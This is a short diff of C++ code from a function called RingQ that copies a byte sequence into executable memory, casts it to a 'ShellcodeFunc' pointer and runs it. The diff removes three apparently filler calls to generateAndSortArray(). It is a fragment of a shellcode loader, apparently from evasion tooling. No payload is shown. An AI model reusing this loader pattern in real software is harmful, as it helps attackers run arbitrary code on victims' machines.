@@ -239,11 +239,9 @@ void RingQ(const std::string& file_path) {
 
             memcpy(execMemory, byte_sequence, byte_sequence_length);
 
-            generateAndSortArray();
 
             typedef void (*ShellcodeFunc)();
 
-            generateAndSortArray();
 
             ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
              
@@ -251,7 +249,6 @@ void RingQ(const std::string& file_path) {
 
             shellcodeFunc();
 
-            generateAndSortArray();
 
             VirtualFree(execMemory, 0, MEM_RELEASE);
 
